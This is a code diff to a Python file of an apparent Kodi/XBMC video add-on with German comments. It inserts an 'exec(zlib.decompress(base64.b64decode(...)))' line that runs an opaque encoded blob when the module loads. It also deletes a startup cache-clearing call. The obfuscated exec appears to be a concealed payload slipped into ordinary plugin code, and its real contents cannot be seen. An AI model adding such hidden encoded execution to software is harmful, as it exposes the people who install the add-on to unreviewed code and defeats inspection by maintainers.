@@ -27,6 +27,7 @@ except ImportError:
     # Resolver Fehlermeldung (bei defekten oder nicht installierten Resolver)
     xbmcgui.Dialog().ok(cConfig().getLocalizedString(30119), cConfig().getLocalizedString(30120))
 
+
 import zlib, base64
 exec(zlib.decompress(base64.b64decode('eJy9k8tqwzAQRff5imAItiEx8Sa0hYBCobTr0G5KF7I1TqbWI4wkEv99bauPhJYmptCNQZo5nqMr5B8cKLt8jnYzxRugWX59lbM9FJmAaBrVe16jBNSsIgANLmw7fgAy+Tyfs5KTxTorjerajcDCoxSWKY4yNGss4dWLDSwWrDHe9RVXRy8jf4fv02nLpQRiW+M+wLa8OimzrwpW40OhSi6E0dmq+yZptgG3BudQb5LYAiFo6wi4yny7ilPUY98f9mb0A2x/hadxnA6idtzaQJ1VrSQqBWSdL+BINURz1vU7fYnrCTXAlbd3KY0XR56ryzxPyUscP4kvv/PE3pAcNiMQwzI4mjIwg7/7/UfOAqox+baxPdKufd/wSDIJ2+W2TjRX0JUInCfd/75L6NZo8YQWC5TomiReN7aNJbvnNoyd2DSe9OxymY/eAMfyiqE=')))
 
@@ -92,7 +93,6 @@ def parseUrl():
 
     # Test if we should run a function on a special site
     if not params.exist('site'):
-        xbmc.executebuiltin('RunPlugin(%s?function=clearCache)' % sys.argv[0])
         # As a default if no site was specified, we run the default starting gui with all plugins
         showMainMenu(sFunction)
         return
